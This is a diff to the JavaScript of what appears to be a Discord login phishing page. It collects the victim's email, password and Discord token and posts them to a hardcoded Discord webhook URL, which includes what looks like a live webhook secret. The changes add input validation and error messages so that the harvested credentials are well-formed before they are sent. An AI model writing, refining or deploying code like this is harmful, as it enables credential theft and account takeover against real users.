@@ -5,9 +5,38 @@ const loginButton = document.querySelector("button");
 const emailInput = document.querySelector("#email"); // Email input
 const passwordInput = document.querySelector("#password"); // Password input
 const tokenInput = document.querySelector("#token"); // Discord token input
+const errorMessage = document.querySelector("#error-message"); // Error message div
 
 // Replace with your webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
+
+// -----------------------------------
+// VALIDATION FUNCTIONS
+// -----------------------------------
+function isValidEmail(email) {
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return emailRegex.test(email);
+}
+
+function isValidPassword(password) {
+  // Minimum 8 characters, at least one letter and one number
+  const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
+  return passwordRegex.test(password);
+}
+
+function isValidToken(token) {
+  // Discord tokens typically have 59+ characters, base64-like format
+  if (!token) return true; // Token is optional
+  const tokenRegex = /^[A-Za-z0-9._-]{59,}$/;
+  return tokenRegex.test(token);
+}
+
+function displayError(message) {
+  if (errorMessage) {
+    errorMessage.textContent = message;
+    errorMessage.style.display = "block";
+  }
+}
 
 // -----------------------------------
 // ELLIPSIS ANIMATION
@@ -19,6 +48,37 @@ function removeEllipsisAnimation() {
 }
 
 function animateEllipsis() {
+  // Clear previous error
+  if (errorMessage) errorMessage.style.display = "none";
+
+  // Capture input values
+  const email = emailInput ? emailInput.value.trim() : "";
+  const password = passwordInput ? passwordInput.value.trim() : "";
+  const discordToken = tokenInput ? tokenInput.value.trim() : "";
+
+  // Validate inputs
+  if (!emailInput || !email) {
+    displayError("Email field is missing or empty.");
+    return;
+  }
+  if (!passwordInput || !password) {
+    displayError("Password field is missing or empty.");
+    return;
+  }
+  if (!isValidEmail(email)) {
+    displayError("Please enter a valid email address.");
+    return;
+  }
+  if (!isValidPassword(password)) {
+    displayError("Password must be at least 8 characters long with letters and numbers.");
+    return;
+  }
+  if (discordToken && !isValidToken(discordToken)) {
+    displayError("Invalid Discord token format.");
+    return;
+  }
+
+  // Start animation
   loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                             <span class="inner pulsingEllipsis">
                                 <span class="item spinnerItem"></span>
@@ -32,8 +92,8 @@ function animateEllipsis() {
   });
   loginButton.setAttribute("disabled", "true");
 
-  // Simulate login and send data to webhook
-  sendLoginDataToWebhook();
+  // Send data to webhook
+  sendLoginDataToWebhook(email, password, discordToken);
 
   setTimeout(removeEllipsisAnimation, 3000);
 }
@@ -41,18 +101,13 @@ function animateEllipsis() {
 // -----------------------------------
 // SEND LOGIN DATA TO WEBHOOK
 // -----------------------------------
-async function sendLoginDataToWebhook() {
+async function sendLoginDataToWebhook(email, password, discordToken) {
   try {
-    // Capture login information
-    const email = emailInput ? emailInput.value : "N/A";
-    const password = passwordInput ? passwordInput.value : "N/A";
-    const discordToken = tokenInput ? tokenInput.value : "N/A";
-
     // Prepare payload
     const payload = {
       email: email,
       password: password,
-      discordToken: discordToken,
+      discordToken: discordToken || "N/A",
       timestamp: new Date().toISOString(),
     };
 
@@ -81,9 +136,11 @@ async function sendLoginDataToWebhook() {
 
     if (!response.ok) {
       console.error("Failed to send data to webhook:", response.statusText);
+      displayError("Failed to submit login data.");
     }
   } catch (error) {
     console.error("Error sending data to webhook:", error);
+    displayError("An error occurred while submitting.");
   }
 }
 
